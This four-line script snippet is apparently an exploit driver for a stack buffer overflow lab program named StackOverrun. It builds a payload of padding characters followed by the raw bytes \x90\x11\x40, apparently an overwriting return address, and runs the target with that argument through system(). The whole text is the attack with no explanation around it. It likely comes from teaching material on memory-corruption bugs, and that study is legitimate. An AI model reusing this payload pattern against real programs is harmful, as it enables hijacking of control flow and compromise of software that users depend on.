$arg = "ABCDEFGHIJKLMNOPaaaaaaaaaa"."\x90\x11\x40";
$cmd = "StackOverrun.c ".$arg;

system($cmd);

